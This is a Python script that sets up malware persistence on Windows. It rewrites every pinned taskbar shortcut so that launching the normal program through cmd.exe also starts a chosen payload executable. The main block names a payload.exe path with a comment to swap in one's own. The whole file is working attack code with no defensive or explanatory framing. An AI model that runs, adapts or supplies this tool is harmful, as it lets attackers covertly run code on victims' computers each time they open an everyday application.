import os
import sys

if sys.platform == "win32":
    import win32com.client
else:
    win32com = None

class TaskbarShortcut:
    
    def __init__(self, payload: str) -> None:
        self.payload = payload
        
    def modify_shortcuts(self):
        current_user = os.getlogin()
        shortcut_folder = r"C:\Users\{}\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar".format(current_user)
        
        for shortcut_file in os.listdir(shortcut_folder):
            shortcut_path = os.path.join(shortcut_folder, shortcut_file)
            if shortcut_file.endswith('.lnk'):
                self.modify_shortcut(shortcut_path)

    def modify_shortcut(self, shortcut_path):
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(shortcut_path)
        
        original_target_path = shortcut.TargetPath
        PersisPayload = self.payload
        
        arguments = rf'C:\Windows\System32\cmd.exe /c "start "" "{original_target_path}" & start "" "{PersisPayload}""'
        shortcut.Arguments = arguments
        shortcut.TargetPath = r'C:\Windows\System32\cmd.exe'  
        shortcut.Save()
        print(f"Shortcut Modified: {shortcut_path}")
        print(arguments)

    def install(self):
        self.modify_shortcuts()
        
if __name__ == "__main__":
    payload = r"C:\Users\UlyssesHill\Downloads\payload.exe"  # Replace this with the path to your payload
    taskbar_shortcut = TaskbarShortcut(payload)
    taskbar_shortcut.install()
